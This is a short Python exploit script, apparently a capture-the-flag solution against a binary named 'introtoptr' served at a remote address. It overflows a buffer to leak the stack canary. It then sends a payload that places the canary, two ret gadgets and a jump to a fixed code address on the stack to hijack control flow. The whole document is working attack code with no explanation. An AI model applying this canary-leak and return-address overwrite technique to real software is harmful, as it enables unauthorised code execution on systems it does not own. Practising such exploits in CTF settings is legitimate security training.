#!/usr/bin/python3
from itoid import *
gdbscript = '''
b * 0x401326
c
'''
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 146.190.152.5 9243".split(" ")[1:3]
elf, exe, io = execute(host, port, gdbscript, "./introtoptr")
sla, sa, ru, s, sl, rl, r, ra, com, rar, rla, ls, li, lp, rud, d, e, bfh, sp, stp, lj, rj, rlc, sli1, sli2, sli3, sli4, sli5, si1, si2, si3, si4, si5, slai1, slai2, slai3, slai4, slai5, sai1, sai2, sai3, sai4, sai5, cl, int16, i2b = summon(io)
context.log_level = 'debug'

p = b'B'  * 65 + b'aku'
sla(b'mamen\n', p)
rud(b'yo ')
canary = u64(rj(io.recv(7), 8, b'\0'))
li(f"Canary: {hex(canary)}")
pl = b'A' * 72
pl += p64(canary)
pl += b'B' * 8
pl += p64(0x000000000040101a)
pl += p64(0x000000000040101a)
pl += p64(0x40127e)
sl(pl)
sl(b'nyerah\0')
com()